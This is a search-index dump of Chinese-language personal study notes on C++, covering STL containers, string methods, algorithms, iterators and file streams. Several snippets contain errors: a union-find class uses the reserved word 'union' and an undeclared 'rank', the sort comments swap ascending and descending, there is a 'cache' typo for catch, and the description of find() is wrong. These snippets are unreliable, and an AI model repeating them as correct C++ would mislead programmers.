[{"categories":["Notes","Language"],"content":"环境 ","date":"2025-02-05","objectID":"/c/:1:0","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"编译 gcc主要编译C语言，对于C++代码只编译而不自动链接C++标准库，需要使用-lstdc++指定 g++专门编译C++代码，自动链接C++标准库 ./a.out \u003cinfile\u003e outfile # 文件重定向, infile文件中为输入 ","date":"2025-02-05","objectID":"/c/:1:1","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"基础 ","date":"2025-02-05","objectID":"/c/:2:0","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"关键字 extern：只声明变量，由外部定义 explicit：禁止隐式转换，即不自动将 int 转换为 string 类型限定词 volatile：告诉编译器变量可能会被程序外部影响并改变，不进行优化 mutable：只在类的成员变量中使用，mutable 成员可在 const 成员函数中修改 ","date":"2025-02-05","objectID":"/c/:2:1","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"宏 int型最大值最小值 INT_MAX, INT_MIN // limits.h 预定义宏 __LINE__ ; // 程序编译时当前行号 __FILE__ ; // 程序编译时当前文件名 __TIME__ ; // 被编译时间 ","date":"2025-02-05","objectID":"/c/:2:2","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"域 显示访问全局变量：::a ","date":"2025-02-05","objectID":"/c/:2:3","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"类 类的成员变量：xxx_ 参数：xxx 友元类 类B的所有成员函数都是类A的友元函数，能存取类A的私有成员和保护成员 class A { public: friend class B; }; ","date":"2025-02-05","objectID":"/c/:2:4","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"类型 引用：必须初始化 ","date":"2025-02-05","objectID":"/c/:3:0","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"模板 template\u003ctypename T\u003e inline T const\u0026 func(T const \u0026arg){ return T; } template\u003ctypename type\u003e ret-type func-name(parameter list); // 函数模板 template\u003cclass type\u003e class class-name{};// 类模板 type 是占位符类型名 // 调用 cout \u003c\u003c func\u003cint\u003e(1);// 不输入\u003cint\u003e由编译器自己判断 同样适用于类，类模版实例化需输入\u003ctype\u003e告诉编译器类型 ","date":"2025-02-05","objectID":"/c/:3:1","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"数组 // 动态分配数组 int* array = new int[num]; // 不初始化为0 int* array = new int[num](); // 初始化为0 delete[] array; // 创建静态数组 int arr[num]; ","date":"2025-02-05","objectID":"/c/:3:2","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"矩阵 二维数组，(n+1) * (m+1) 矩阵 vector\u003cvector\u003cbool\u003e\u003e f(n + 1, vector\u003cbool\u003e(m+1), -1); //矩阵f, n+1 行, 每行初始化为vector\u003cbool\u003e(m+1) 即 m+1 列, 每个初始化为-1 ","date":"2025-02-05","objectID":"/c/:3:3","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"结构体 定义 struct animal { int num; animal(int n): num(n){} //构造函数 bool operator \u003c (animal a) const{ // 重载函数 return xxx; } }; animal a(1); const int N = 1000; struct Q { int x; int y; } que[N]; que[idx] = {t.x, t.y}; ","date":"2025-02-05","objectID":"/c/:3:4","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"字符串 原始字符串：R\"(xxxx)\"，可以插入任何字符串而不作任何转义 库类型std::string，可变长字符序列 动态分配 // 动态分配一个空字符串对象 std::string *error = new std::string(\"\"); 初始化 string s(\"Hello\"); string s1(\"hello\", 3); // hel string s2(\"hello\", 2, 2); // start, size : ll string s3(5, 'a'); // aaaaa string s4({'a','b','c'}); // abc s1.assign(s2); // s1 = s2 s1.assign(\"h\"); // s1: h s1.assign(\"hello\", 3); // s1: hel s1.assign(3, 'x'); // s1:\"xxx\" s1.assign({'a','b'}); // s1: \"ab\" 长度 int n = s.size(); // s.length() int c = s.capacity(); // 存储空间大小 s.reserve(num); // num \u003c capacity 不改变, \u003e capacity 则容量改变 s.shrink_to_fit(); // 压缩存储空间大小 s.resize(20, 'x'); // 重置大小为20, 不够填充'x', 默认0 迭代器访问 for(string::iterator it = str.begin(); it != str.end(); ++it){ *it = ' '; // 更改值 } string n; for(char \u0026itr : n){ itr--; // 字符减一 } 取值 s.front(); // 第一个字符 s.back(); // 最后一个字符 插入 s.insert(s.begin(), ' '); // 开头插入空格 s.insert(2, 3, 'x'); // 在索引2处插入3个'x' s.insert(3, \"hello\"); // 在索引3处插入\"hello\" s.push_back('z'); // 末尾加入元素 s.append(\"xx\"); // 末尾加入string字符串 string str = str1 + str2; // 拼接 获取一行字符串 while(getline(cin, str)); // 字符串中可包含空格 getline(cin, s, ';'); // 停止界定符 转换为cstring str = \"abc\"; str.c_str(); // \"abc\\0\" str.data(); // \"abc\" number转换为string s = to_string(8); // 2.3e7 string转换为number s = \"190\"; int i = stoi(s); // 190 s = \"190 hello\"; size_t pos; i = stoi(s, \u0026pos); // i:190 pos=3指向非number // stol:to long, stod: to double, stof: to float 查找 size_t found = str.find(\"xx\"); // 找不到返回string::npos, 找到返回下标 found = s.find(\"u\", 2, 4); // 从索引2开始找字符串前4的子串 s.find_first_of(\"abc\"); s.find_first_not_of(\"abc\"); s.find_last_of(\"abc\"); 删除 // 去除字符串前后空格 str.erase(0, str.find_first_not_of(\" \")); // 找不到返回string::npos str.erase(str.find_last_not_of(\" \") + 1); str.erase(start, size); str.erase(itr, itr+5); str.pop_back(); str.clear(); // 清空元素 交换 s1.swap(s2); // 交换2个字符串 swap(str[0], str[2]); // 交换2个字符 替换 str.replace(2, 3, \"re\"); // 从索引2开始的3个元素更改为\"re\" str.replace(2, 3, 4, 'y'); // 从索引2开始的3个元素被替换插入4个'y' replace(str.begin(), str.end(), 'e', ' '); // 替换字母 比较 if(str \u003e= \"10\"); // 代表数字字符串可直接比较 // 相等返回0, 不匹配的第一个字符值低或字符匹配但字符串短\u003c0, 不匹配第一个字符值大或字符串长\u003e0 int ret = s1.compare(s2); s1.compare(start, num, s2); // s1从start开始与s2比较num个字符 子串 sub_str = str.substr(2, 3); // 从索引2开始的3个字符拷贝 拷贝 s = \"abcdefg\" char buf[20]; size_t len = s.copy(buf, 3); // buf: abc, len=3 len = s.copy(buf, 4, 2); // buf: cdef, len=4 从索引2开始拷贝4个 ","date":"2025-02-05","objectID":"/c/:3:5","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"链表 结构体 typedef struct ListNode { int val; ListNode *next; ListNode(int x) : val(x), next(nullptr) {} ListNode() : val(0), next(nullptr) {} ListNode(int x, ListNode *next) : val(x), next(next) {} }; void printLinkList(ListNode *head) { ListNode *current = head; while (current != nullptr) { std::cout \u003c\u003c current-\u003eval \u003c\u003c \" -\u003e \"; current = current-\u003enext; } std::cout \u003c\u003c \"nullptr\" \u003c\u003c std::endl; } ListNode *initLinkList(int arr[], int n) { if (n == 0) { return nullptr; } ListNode *head = new ListNode(arr[0]); ListNode *current = head; for (int i = 1; i \u003c n; ++i) { current-\u003enext = new ListNode(arr[i]); current = current-\u003enext; } return head; } 类 class ListNode { public: int val; // 节点的值 ListNode *next; // 指向下一个节点的指针 ListNode(int x) : val(x), next(nullptr) {} // 构造函数 ListNode(int x){ xxxx; } }; 创建 ListNode *temp = new ListNode(0), *cur = temp; //虚拟头结点temp, cur指向temp cur-\u003enext = new ListNode(l-\u003evalue); //创建一个新链表 判断指针是否为尾 while(ptr-\u003enext) 倒数第n个结点 快慢指针，使两指针移动相差n，快指针到结尾，则慢指针在倒数第n+1个结点 ","date":"2025-02-05","objectID":"/c/:3:6","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"数据结构容器 ","date":"2025-02-05","objectID":"/c/:4:0","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"数组 动态数组vector 定义 vector\u003ctype\u003e name; vector\u003cint\u003e pos(128, -1);// 初始化ASCII码共128个元素，每个元素值为-1 vector\u003cpair\u003cint,int\u003e\u003e tint; //每组为一对int型的数组 tint.emplace(xx, xx); // 取数 tint[i].first, tint[i].second ... vector\u003cint\u003e a({1,2,3}); 比较 vector\u003cint\u003e xx(25, 0); vector\u003cint\u003e yy(25, 0); xx == yy; // 可直接比较 判空 vector.empty() 元素个数 vector.size() 增删 vector.push_back({xx,xx,xx}) vector.pop_back() 清空 vec.clear() 拷贝构造 vector\u003ctype\u003e vec2(vec); 设置大小及内容 vec.resize(size, 0); // 0为填充数据 交换两个vector容器内容 vec2.swap(vec); 首元素 vector\u003cint\u003e::iterator it = vector.begin()// 返回迭代器 尾元素 vector.end()// 返回置迭代器，最后元素的下一个位 首尾半开放：[begin, end) 迭代器 vector\u003ctype\u003e::iterator it; cout \u003c\u003c *it \u003c\u003c endl; //取值 取数 vec[1] vec.at(1) // 若越界会抛出异常 遍历访问 for (auto it : vec) cout \u003c\u003c it \u003c\u003c endl; // 遍历，it不需要提前声明，vec为vector\u003ctype\u003e 修改 int *p = \u0026vec[0]; // 赋值p为第一个值的内存地址 p[1] = 6; // 改变vec值 静态数组array array\u003cint, 3\u003e a = {1,2,3}; a.begin(); a.end(); a.size(); a.swap(); 动态内存 double * pvalue = NULL; pvalue = new double; // 堆上分配 double 类型空间，地址赋值给 pvalue delete pvalue; // 释放单个对象 pvalue = new char[20]; // 数组分配， pvalue 指向一个数组 delete [] pvalue; // 释放数组对象 // 对象 Type_name* my_TypeArray = new Type_name[4]; delete [] my_TypeArray; // 删除数组 ","date":"2025-02-05","objectID":"/c/:4:1","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"队列 queue 定义 queue\u003ctype\u003e q; // 定义 初始化 queue\u003ctuple\u003cint, int, int\u003e\u003e q; q.emplace(x, x, x); // 容器内直接构造元素 auto [x, y, time] = q.front(); // 接收元素 基础操作 q.empty() // 判空 q.size() // 元素个数 q.front() // 队列头 q.back() // 队列尾 q.pop() // 删除 q.push() // 添加 deque双端队列 deq.push_front(2); // 前插入 deq.push_back(3); // 后插入 priority_queue优先队列 priority_queue\u003ctype\u003e pq; // 大根堆 priority_queue\u003ctype, vector\u003ctype\u003e, greater\u003ctype\u003e\u003e name; // 小根堆 /* struct cmp{ bool operator() (ListNode* a, ListNode* b){ return a-\u003eval \u003e b-\u003eval; } } */ 访问 heap.push(x) // 增加 heap.empty() // 判空 heap.top() // 头元素 heap.pop() // 弹出头元素 ","date":"2025-02-05","objectID":"/c/:4:2","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"链表 list双向链表 初始化 using listnode = std::pair\u003cint, int\u003e; using listptr = typename std::list\u003clistnode\u003e::iterator; std::list\u003clistnode\u003e linklist; list\u003cint\u003e li = {1, 2, 3}; 插入 list\u003cint\u003e::iterator itr = find(l.begin(), l.end(), 2); // itr-\u003e2 list.insert(itr, 8); // 向itr指向值前方插入8 增删 // push_front push_back l.erase(itr); // 删除itr指向值 linklist.pop_back(); linklist.push_front({key, value}); 遍历 linklist.begin(); for (auto it = mylist.begin(); it != mylist.end(); ++it){ cout \u003c\u003c *it \u003c\u003c \" \"; } cout \u003c\u003c endl; 移动 linklist.splice(linklist.begin(), linklist, listptr-\u003esecond); // arg1: 目标位置; arg2: 源链表，可为自己, arg3: 要移动的元素，迭代器指向的元素 ","date":"2025-02-05","objectID":"/c/:4:3","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"集合 set：红黑树实现，自动排序，\u003c\u003e接收2参数：元素类型，比较器类型，每个值唯一，值不可修改 multiset：允许重复值，值不可修改 unordered_set：无序集合 定义 set\u003cint\u003e myset; set\u003cint, less\u003cint\u003e\u003e s; 插入 pair\u003cset\u003cint\u003e::iterator, bool\u003e ret; ret = myset.insert(2); // 若已有2，返回（it-\u003e2, false) // ret.first, ret.second 迭代器可通过此获取值 查找 set\u003cint\u003e::iterator it; it = myset.find(2); 删除 myset.erase(it); myset.erase(value); 无序集合 unordered_set\u003cint\u003e aset; aset.insert(xx); // 检查 unordered_set\u003cstring\u003e::const_iterator it = myset.find(\"hello\"); if(it != myset.end()) cout \u003c\u003c *it \u003c\u003c endl; 接口 myset.load_factor(); // 装载因子 myset.bucket(x); // x的索引 myset.bucket_count(); // 索引总数 数组转集合 unordered_set\u003cint\u003e us(nums.begin(), nums.end()); us.contains(xxx) // 包含 ","date":"2025-02-05","objectID":"/c/:4:4","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"哈希表 键值对存储 pair类型，map multimap：允许重复值，multimap和map的键不允许修改 定义 map\u003ctype t1, type t2\u003e mp; unordered_map\u003ctype1, type2\u003e hp; // 无序哈希表 hp = { {x1, x2}, {y1, y2} }; // 初始化 状态 mp.empty(); // 判空 mp.size(); // 元素个数 mp.begin(); // 返回迭代器 mp.end(); // 最后一个元素的下一位 mp.reserve(100); // 预留100大小 // 取值 (*it).first;// 键 (*it).second;// 值 // *it的类型: pair\u003cconst type1, type2\u003e 增删 map.insert(pair\u003ctype, type\u003e(x1, x2)); // 添加，不可修改 map.insert(make_pair(x1, x2)); mp['a'] = \"aa\"; // 修改或插入 map.erase(); // 删除 map.erase(key); map.clear(); // 清空 查找 mp.find(first, last, val); // [first, last) if(mp.find(val) != mp.end()){找到val} // 检查unordered_map中是否存在给定键的元素value unordered_map\u003cint, string\u003e umap; if(umap.count(1)){...} 遍历 for(const auto\u0026 pair : mp){ cout \u003c\u003c pair.first \u003c\u003c \": \" \u003c\u003c pair.second \u003c\u003c endl; } for(const auto \u0026[x, indices] : xmap) ","date":"2025-02-05","objectID":"/c/:4:5","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"栈 #include\u003cstack\u003e stack\u003cint\u003e sk 状态 sk.empty(); //是否为空 sk.size(); //元素个数 增删 sk.push(); //添加 sk.pop(); //删除 访问 sk.top(); //栈顶元素 ","date":"2025-02-05","objectID":"/c/:4:6","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"二叉树 struct TreeNode{ type value; TreeNode *leftChild; TreeNode *rightChild; }; ","date":"2025-02-05","objectID":"/c/:4:7","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"大根堆 make_heap(vec.begin(), vec.end()); pop_heap(vec.begin(), vec.end()); // 移除最大元素 vec.pop_back(); // 移除最大元素 push_heap(vec.begin(), vec.end()); // 加入新值 vec.push_back(); // 堆排序 sort_heap(vec.begin(), vec.end()); ","date":"2025-02-05","objectID":"/c/:4:8","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"并查集 class UnionSet{ private: vector\u003cint\u003e parent; // 父结点 vector\u003cint\u003e deep; // 树深度 public: UnionSet(int n){ parent.resize(n); deep.resize(n, 0); for(int i = 0; i \u003c n; ++i){ parent[i] = i; } } int find(int x){ if(parent[x] != x){ parent[x] = find(parent[x]); // 递归找根 } return parent[x]; } void union(int x, int y){ int rootX = find(x); int rootY = find(y); if(rootX != rootY){ if(rank[rootX] \u003c rank[rootY]){ rank[rootX] = rootY; }else if(rank[rootX] \u003e rank[rootY]){ rank[rootY] = rootX; }else{ rank[rootX] = rootY; rank[rootY]++; } } } } ","date":"2025-02-05","objectID":"/c/:4:9","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"基本操作 运算符 (a \u003c b) ? (func1, func2) : (func3, func4) // 逗号运算符(表达式1, 表达式2) 将会执行表达式1和表达式2，整个表达式的值为表达式2的值 取模 ((x%p)+p)%p // 将任意值转移到0~p之间 数字字符char转为数字 str - '0' 字母字符转为数字 str - 'A' 初始化数组 memset(str, 0, sizeof(str)); 检查字符是否为十进制数字字符 isdigit() 最值 max(a,b) min(a,b) 查询最大(小)值所在的第一个位置 max_element(begin, end) min_element(begin, end) int ans = *max_element(dist.begin(), dist.end()); // 获取到指向某个元素的迭代器，解引用*获取该元素 整型十六进制 printf(\"%#x\", n) 整数求对应ASCII码的符号 (char)n 字符求对应ASCII码值 int(string[i]) 整型转换为二进制字符串 bitset\u003c8\u003e binary(int_number); // 8表示二进制串的位数 binary.to_string(); 二进制字符串转换为整型 bitset\u003c5\u003e tempbit(string_value); // 先转换为bitset int tempdec = (int)tempbit.to_ulong(); // 再转换为整型 输入格式 #include\u003cbits/stdc++.h\u003e while(scanf(\"%d\", \u0026h) != EOF){ xxx; } 合并有序序列 // 都需要有序 merge(vec.begin(), vec.end(), // 范围1 vec2.begin(), vec2.end(),// 范围2 vec_out.begin()); // 输出数组 // 原序列上合并两个有序的子序列 vector\u003cint\u003e vec = {1,2,3,4,1,2,3,4}; inplace_merge(vec.begin(), vec.begin()+4, vec.end()); // 1,1,2,2,3,3,4,4 类型转换 // void * 指针转换为具体类型指针 auto *xxx = static_cast\u003csome_type *\u003e(voidPtr); // xxx 强制转换为 type 类型 reinterpret_cast\u003ctype\u003e(xxx); 异常处理 throw \"xxx\" try{ xx }catch( ExceptionName e){ xx }catch(const char * msg){ cerr \u003c\u003c msg \u003c\u003c endl; }cache(std::exception \u0026e) { WARN(\"xxx\", e.what()); } 计时 auto start = std::chrono::high_resolution_clock::now(); auto end = std::chrono::high_resolution_clock::now(); auto duration = std::chrono::duration_cast\u003cstd::chrono::milliseconds\u003e(end - start); std::cout \u003c\u003c duration.count() \u003c\u003c std::endl; 断言 ASSERT( xxx, \"'{0}', {1}\", arg1, arg2;) // arg1 替换{0}, arg2替换{1} ","date":"2025-02-05","objectID":"/c/:5:0","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"库 ","date":"2025-02-05","objectID":"/c/:6:0","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"标准库 std::move // 显式移动某个对象资源，避免不必要复制 std::string a = \"hello\"; std::string b = std::move(a); // 移动构造 // 此时 a 被“清空”，b 拥有原来 a 的资源 判断 std::isprint(ch) // 是否为可打印字符 std::isspace(ch) // 是否为空格 std::type_index // 运行时类型识别（RTTI） std::type_index int_idx = std::type_index(typeid(int)); int_idx.name(); // 获取类型名 // 获取表达式或类型的类型信息 typeid(type) std::is_base_of std::is_base_of\u003cA, B\u003e::value // 查看B是否继承自A，即B是A的派生类 输入输出 setw(2) setfill('0') ","date":"2025-02-05","objectID":"/c/:6:1","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"gflags 用于解析输入命令行变量 DEFINE_int32(var_name, 默认值, 描述); // 使用 gflags::ParseCommandLineFlags(\u0026argc, \u0026argv, true); // 访问时 FLAGS_var_name // 在其他文件，跨文件访问调用 DECLARE_string(var); // 类似于 extern ","date":"2025-02-05","objectID":"/c/:6:2","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"libconfig libconfig::Config \u0026cfg // 加载配置文件 cfg.readFile(\"xxx.cfg\");// 读取文件 cfg.lookup(\"xxx.xxx\") // libconfig::Setting root = cfg.getRoot(); // 获取根Setting // 修改配置 root[\"xxxx\"] = xxx; root[i] // 获取子元素 // 写入文件 cfg.writeFile(\"xxx.cfg\"); root.isGroup() // 类似结构体 {} root.isArray() // 同类型元素有序集合 [] root.isList() // 不同类型元素有序集合 () root.isScalar() // 标量 ","date":"2025-02-05","objectID":"/c/:6:3","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"chrono std::chrono::nanoseconds var; // 纳秒 std::chrono::steady_clock::now(); // 当前时间 std::chrono::steady_clock::time_point()::min(); // 时间点类型可表示的最小值：\"从未发生\"初始状态 ","date":"2025-02-05","objectID":"/c/:6:4","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"高级操作 ","date":"2025-02-05","objectID":"/c/:7:0","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"指针 std::unique_ptr：智能指针，实现独占所有权资源管理模式，动态分配内存资源只被一个指针所拥有 ","date":"2025-02-05","objectID":"/c/:7:1","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"排序 适用于vector，deque，array等可随机访问结构 sort(vec.begin(), vec.end(), compare_function); // 通过compare_function排序 partial_sort(vec.begin(), vec.begin()+5, vec.end(), greater\u003cint\u003e()); // 获取最大前5个值 sort(arr.begin(), arr.end(), greater\u003cint\u003e()); // 升序 sort(arr.begin(), arr.end(), less\u003cint\u003e()); // 降序 // compare函数 bool compare_function(data a, data b) { if(xxx) { return a.val \u003c b.val; } return a.val \u003e b.val; } 将满足某条件值移到最前 bool lessThanten(int i){ return (i \u003c 10); } partition(vec.begin(), vec.end(), lessThanten); stable_partition(vec.begin(), vec.end(), lessThanten); // 保持原有顺序 逆序 reverse(str.begin(), str.end()); ","date":"2025-02-05","objectID":"/c/:7:2","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"查找 二叉查找 bool found = binary_search(vec.begin(), vec.end(), 9); //查找9是否在 bool found = includes(vec.begin(), vec.end(), // s和vec均有序 s.begin(), s.end());// 若s所有元素被包含在vec中返回true itr = lower_bound(vec.begin(), vec.end(), 9); // 找到9可以被插入保持有序的第一个位置 itr = upper_bound(vec.begin(), vec.end(), 9); // 找到9可以被插入保持有序的最后一个位置 pair_of_itr = equal_range(vec.begin(), vec.end(), 9); // 返回第一和最后的位置对 ","date":"2025-02-05","objectID":"/c/:7:3","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"迭代器操作 范围半开放：[begin, end) 计数 int n = count(vec.begin(), vec.end(), val); // 返回val个数 int n = count_if(vec.begin(), vec.end(), [](int x){return x\u003c10;}); //返回满足条件的个数 比较 itr = max_element(vec.begin(), vec.end()); // 返回第一个最大值*itr itr = max_element(vec.begin(), vec.end(), [](int x, int y){return (x%10)\u003c(y%10);}); // 返回满足比较方法条件的第一个最大值 pair_of_itr = minmax_element(vec.begin(), vec.end(), [](int x, int y){return (x%10)\u003c(y%10);}); // 返回一对迭代器 线性搜索 itr = find(vec.begin(), vec.end(), val); // 查找val,返回找到值的下一位的索引 itr = find_if(vec.begin(), vec.end(), [](int x){return x\u003e80;}); itr = find_if_not(vec.begin(), vec.end(), [](int x){return x\u003e80;}); itr = search_n(vec.begin(), vec.end(), count, val); // 查找连续count的val distance(vec.begin(), itr); // itr的索引, 获取两者间距离 // 强行转换为 int 型: static_cast\u003cint\u003e(distance(nums.begin(), itr)) // 查找子集 itr = search(vec.begin(), vec.end(), sub.begin(), sub.end()); itr = find_end(vec.begin(), vec.end(), sub.begin(), sub.end()); // 查找最后一个子范围 // 查找到items中任何一个均可 itr = find_first_of(vec.begin(), vec.end(), items.begin(), items.end()); // 联结搜索, 默认搜索连着的相同的 itr = adjacent_find(vec.begin(), vec.end(), [](int x, int y){return x==y*4}); 比较 if(equal(vec.begin(), vec.end(), vec2.begin())){} // 相同 if(is_permutation(vec.begin(), vec.end(), vec2.begin())){} // 相同元素不同顺序 pair_of_itr = mismatch(vec.begin(), vec.end(), vec2.begin()) // 找到第一个不同 lexicographical_compare(vec.begin(), vec.end(), vec2.begin(), vec2.end()); // 一比一比较小于 检查 is_sorted(vec.begin(), vec.end()) // 检查是否有序 is_sorted_until(vec.begin(), vec.end()); // 直到...均有序 is_partitioned(vec.begin(), vec.end(), [](int x){return x\u003e80;}); // 检查是否以该条件区分开 is_heap(vec.begin(), vec.end()) // 检查是否为堆 is_heap_until(vec.begin(), vec.end()) // 直到...前为堆 // 检查是否 所有/任何一个/无 元素满足条件 all_of(vec.begin(), vec.end(), [](int x){return x\u003e80;}); any_of(vec.begin(), vec.end(), [](int x){return x\u003e80;}); none_of(vec.begin(), vec.end(), [](int x){return x\u003e80;}); 拷贝 copy(vec.begin(), vec.end(), vec2.begin()); copy_if(vec.begin(), vec.end(), vec2.begin(), [](int x){return x\u003e80;}); copy_n(vec.begin(), count, vec2.begin()); // 拷贝count个 copy_backward(vec.begin(), vec.end(), vec2.end());// 从后拷贝进入 移动 // 若为string可能原vec被移动的就消失了，若是int则直接类似于拷贝 move(vec.begin(), vec.end(), vec2.begin()); move_backward(vec.begin(), vec.end(), vec2.begin()); 转移 transform(vec.begin(), vec.end(), // vec3[0] = vec[0] - 1 vec3.begin(), [](int x){ return x-1;}); transform(vec.begin(), vec.end(), vec2.begin(), vec3.begin(), [](int x, int y) {return x+y;}); // vec3[0] = vec[0] + vec2[0] 交换 swap_ranges(vec.begin(), vec.end(), vec2.begin()); // 双向拷贝 填充 fill(vec.begin(), vec.end(), val); // 填充val fill_n(vec.begin(), count, val); // 填充count个val generate(vec.begin(), vec.end(), rand); // 生成 generate_n(vec.begin(), count , rand); 替代 replace(vec.begin(), vec.end(), // 数据范围 6, // 原始值 9); // 新的值 replace_if(vec.begin(), vec.end(), [](int x){return x\u003e80;}, 9); replace_copy(vec.begin(), vec.end(), // 源 vec2.begin(), // 目的 6, // 原始值 9); // 新值 移除 remove(vec.begin(), vec.end(), 3); // 移除所有的3 remove_if(vec.begin(), vec.end(), [](int x){return x\u003e80;}); // 条件删除 remove_copy(vec.begin(), vec.end(), vec2.begin(), 6);// 移除所有的6，剩余值拷贝到vec2中 unique(vec.begin(), vec.end()); // 移除连续的相同的元素 unique(vec.begin(), vec.end(), less\u003cint\u003e()); // 移除比前一个元素大的元素 unique_copy(vec.begin(), vec.end(), vec2.begin()); 倒置 reverse(vec.begin(), vec.end()); reverse_copy(vec.begin(), vec.end(), vec2.begin()); 旋转 rotate(vec.begin(), vec.begin()+3, vec.end()); // 1 2 3 4 5 6 7 // 4 5 6 7 1 2 3 打乱 random_shuffle(vec.begin(), vec.end()); shuffle(vec.begin(), vec.end(), default_random_engine()); 更改 // vector, deque, array等随机访问迭代器可对迭代器直接加减,比较 vector\u003cint\u003e::iterator itr; // 可以直接用 auto 代替 ++itr; if(itr2\u003eitr2) ...; itr = itr + 2; // list, set/multiset, map/multimap等双向迭代器只可自加减 ++itr; --itr; // forward_list等单向迭代器只可自增，不可自减 ++itr; int x = *itr; *itr = 100; // 更改值 advance(itr, 5); // 等价于 itr+=5 std::advance(iterator, 2); // 迭代器前移2个位置 std::distance(vec.begin(), iterator); // 获取索引 流迭代器 vector\u003cstring\u003e vec4; // 从标准输入读取字符串","date":"2025-02-05","objectID":"/c/:7:4","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"函数 函数对象：重载了operator()类的实例 内置函数对象 int x = multiplies\u003cint\u003e()(3, 4); // x = 3 * 4 if(not_equal_to\u003cint\u003e()(x, 10)) // if(x!=10) 自定义函数对象 // 构造函数对象，用于将元素乘以10 class MultiplyBy10 { public: int operator()(int x) const { return x * 10; } }; std::vector\u003cint\u003e nums = {1, 2, 3, 4, 5}; std::vector\u003cint\u003e result; // 使用 std::transform 和自定义函数对象 MultiplyBy10 将 nums 中的每个元素乘以10 std::transform(nums.begin(), nums.end(), // 源 std::back_inserter(result), // 目的 MultiplyBy10()); 绑定器：将函数或函数对象的某些参数绑定为固定值 transform(myset.begin(), myset.end(), // 源 back_inserter(vec), // 目的 bind(multiplies\u003cint\u003e(), placeholders::_1, 10));// 绑定器 // placeholders::_1 占位符，表示 transform 传入的每个元素 // 绑定了multiplies的第2个参数为10 函数转化为函数对象 double Pow(double x, double y){ return pow(x, y); } auto f = function\u003cdouble (double, double)\u003e(Pow); lambda函数 [] (int x){return (x\u003e20)||(x\u003c5)}; 构造函数 NonCopyable() = default; // 允许默认构造 NonCopyable(const NonCopyable\u0026) = delete; // 禁止拷贝构造 NonCopyable\u0026 operator=(const NonCopyable\u0026) = delete; // 禁止复制赋值 ","date":"2025-02-05","objectID":"/c/:7:5","tags":["language"],"title":"C++","uri":"/c/"},{"categories":["Notes","Language"],"content":"输入输出流 创建支持流的类 struct Dog { int age_; string name_; }; ostream\u0026 operator\u003c\u003c(ostream\u0026 sm, const Dog\u0026 d){ sm \u003c\u003c \"name is \" \u003c\u003c d.name_ \u003c\u003c \" and age is \" \u003c\u003c d.age_ \u003c\u003c endl; return sm; } istream\u0026 operator\u003e\u003e(istream\u0026 sm, Dog\u0026 d){ sm \u003e\u003e d.name_; sm \u003e\u003e d.age_; return sm; } int main(){ Dog d{2, \"Bob\"}; cout \u003c\u003c d; // name is Bob and age is 2 cin \u003e\u003e d; } 格式化数据 cout.setf(ios::oct, ios::basefield); // 输出八进制 cout.setf(ios::hex, ios::basefield); // 输出十六进制 cout.setf(ios::dec, ios::basefield); // 输出十进制 cout.setf(ios::showbase); // 会输出几进制前的标识符: 0x, 0等 cout.unsetf(ios::showbase); cout.width(10); // 宽度为10个字符 cout.setf(ios::left, ios::adjustfield); // 靠左 文件流 打开文件写 ofstream of1(\"h.txt\"); // 创建文件写 或 打开文件并清空原内容 ofstream of2(\"a.txt\", ofstream::app); // append加入到原内容后 ofstream of3(\"b.txt\", ofstream::in | ofstream::out); // 从中间加入内容 of3.seekp(10, ios::beg); // 将输出指针移动到begin的后10个字符处，覆写 of3.seekp(-5, ios::end); // 离end的前5个字符处 文件位置指针 std::ifstream fileobj(\"data.txt\", std::ios::binary); fileobj.seekg(n); // 定位到第 n 个字节 fileobj.seekg(n, ios::cur); // 读指针从 fileobj 当前位置后移 n 个字节 fileobj.seekg(n, ios::end); // 末尾前移 n 个字节 fileobj.seekg(0, ios::end); // 定位到结尾 写入文件 of \u003c\u003c \"hello\" \u003c\u003c endl; // hello of \u003c\u003c 233 \u003c\u003c endl; // 233 of \u003c\u003c bitset\u003c8\u003e(14) \u003c\u003c endl; // 00001110 of \u003c\u003c complex\u003cint\u003e(2,3) \u003c\u003c endl; // 